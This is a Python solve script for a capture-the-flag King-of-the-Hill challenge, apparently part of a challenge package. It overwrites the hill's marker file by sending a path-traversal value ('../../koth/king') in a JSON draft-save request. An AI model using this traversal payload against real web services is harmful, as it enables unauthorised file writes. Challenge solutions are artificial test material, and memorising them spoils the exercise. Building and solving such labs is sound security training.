#!/usr/bin/env python3
"""Overwrite Draft Control's KotH marker through the relative draft path."""

import argparse
import json
import urllib.error
import urllib.request


MARKER_PATH = "../../koth/king"
MAX_RESPONSE_BYTES = 2048


def solve(url, token):
    """Write the current team token and return the bounded save confirmation."""
    encoded_token = token.encode("utf-8")
    if not encoded_token or len(encoded_token) > 256 or "\n" in token or "\r" in token:
        raise ValueError("token must be one non-empty line of at most 256 bytes")

    payload = json.dumps(
        {"content": token, "path": MARKER_PATH},
        separators=(",", ":"),
    ).encode("utf-8")
    request = urllib.request.Request(
        f"{url.rstrip('/')}/api/drafts",
        data=payload,
        headers={"Content-Type": "application/json", "Connection": "close"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=5) as response:
        body = response.read(MAX_RESPONSE_BYTES + 1)
        content_type = response.headers.get_content_type()

    if len(body) > MAX_RESPONSE_BYTES or content_type != "application/json":
        raise ValueError("service returned an unexpected response")
    value = json.loads(body)
    if value != {
        "bytes": len(encoded_token),
        "path": MARKER_PATH,
        "status": "saved",
    }:
        raise ValueError("marker update was not acknowledged")
    return f"saved {MARKER_PATH}; wait for rsctf attribution"


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True, help="issued shared hill URL")
    parser.add_argument("--token", required=True, help="current team KotH token")
    args = parser.parse_args()

    try:
        result = solve(args.url, args.token)
    except (json.JSONDecodeError, OSError, UnicodeError, ValueError, urllib.error.URLError) as error:
        parser.exit(1, f"solve failed: {error}\n")

    print(result)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
